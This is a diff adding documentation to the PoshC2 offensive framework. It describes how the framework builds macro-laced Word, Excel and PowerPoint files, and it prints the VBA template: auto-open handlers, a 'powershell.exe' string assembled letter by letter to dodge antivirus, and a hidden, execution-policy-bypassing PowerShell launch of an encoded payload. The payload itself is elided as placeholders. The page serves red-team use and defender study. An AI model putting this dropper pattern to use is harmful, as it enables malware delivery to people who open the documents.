@@ -1,3 +1,60 @@
 ##################
  Macro Documents
 ##################
+Mitre ATT&CK - `Powershell <https://attack.mitre.org/wiki/Technique/T1086>`_
+
+Office documents have been weaponised over the years utilising macros. PoshC2 creates a custom macro and embeds this into a Word Document, Excel Workbook and Powerpoint File. The VBScript called "powershell.exe" but slightly obfuscates the code to try and evade Anti-Virus scanners searching for the literal string "powershell.exe".
+
+The macro is set to run on opening each document using "AutoRuns", so when the document is opened, depending on the Macro settings on the target machine, the system will either automatically execute powershell or the user will have to accept the macro warning. 
+
+The Macro code is shown below::
+
+	Sub Auto_Open()
+	UpdateMacro
+	End Sub
+
+	Sub AutoOpen()
+	UpdateMacro
+	End Sub
+
+	Sub Workbook_Open()
+	UpdateMacro
+	End Sub
+
+	Sub WorkbookOpen()
+	UpdateMacro
+	End Sub
+
+	Sub Document_Open()
+	UpdateMacro
+	End Sub
+
+	Sub DocumentOpen()
+	UpdateMacro
+	End Sub
+
+	Sub UpdateMacro()
+	Dim str, exec, wsh
+
+	str = "<base64 payload merged across multiple lines>"
+	str = "<base64 payload merged across multiple lines>"
+	str = "<base64 payload merged across multiple lines>"
+	str = "<base64 payload merged across multiple lines>"
+	str = "<base64 payload merged across multiple lines>"
+	str = "<base64 payload merged across multiple lines>"
+
+	exec = "p"
+	exec = exec + "o"
+	exec = exec + "w"
+	exec = exec + "e"
+	exec = exec + "r"
+	exec = exec + "s"
+	exec = exec + "h"
+	exec = exec + "e"
+	exec = exec + "l"
+	exec = exec + "l"
+	exec = exec + "."
+	exec = exec + "e"
+	exec = exec + "x"
+	exec = exec + "e"
+	exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str
